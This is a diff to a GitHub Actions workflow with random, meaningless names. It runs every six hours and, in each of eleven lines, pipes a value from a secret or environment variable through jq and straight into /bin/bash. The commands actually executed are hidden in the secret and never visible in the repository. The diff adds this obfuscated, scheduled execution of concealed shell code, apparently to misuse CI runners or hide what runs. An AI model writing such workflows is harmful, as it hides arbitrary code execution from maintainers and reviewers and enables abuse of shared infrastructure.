@@ -1,23 +1,26 @@
 name: donecartography
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
+    - cron: '5 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: donecartography
         env:
-          untq92408: ${{ secrets.untq92408 }}
+          axtnr91838: ${{ secrets.axtnr91838 }}
         run: |
-          echo $untq92408 | jq -r .bvhd149 | /bin/bash
-          echo $i2611 | jq -r .pt72180 | /bin/bash
-          echo $eyl8675 | jq -r .pqaa604 | /bin/bash
-          echo $m5395 | jq -r .ox5 | /bin/bash
-          echo $t186 | jq -r .si7 | /bin/bash
-          echo $i9482 | jq -r .p70616 | /bin/bash
+          echo $axtnr91838 | jq -r .eqzze8443 | /bin/bash
+          echo $w27495 | jq -r .ibj29624 | /bin/bash
+          echo $rjw58 | jq -r .fh450 | /bin/bash
+          echo $umqo9 | jq -r .tfxdv133 | /bin/bash
+          echo $vcb0887 | jq -r .pdd41267 | /bin/bash
+          echo $kh405 | jq -r .vat10 | /bin/bash
+          echo $wma0827 | jq -r .rcdg60 | /bin/bash
+          echo $jsv7207 | jq -r .huapo961 | /bin/bash
+          echo $k236 | jq -r .hw67 | /bin/bash
+          echo $aqixe9466 | jq -r .gyxj5 | /bin/bash
+          echo $ufqc47 | jq -r .kg15579 | /bin/bash
 
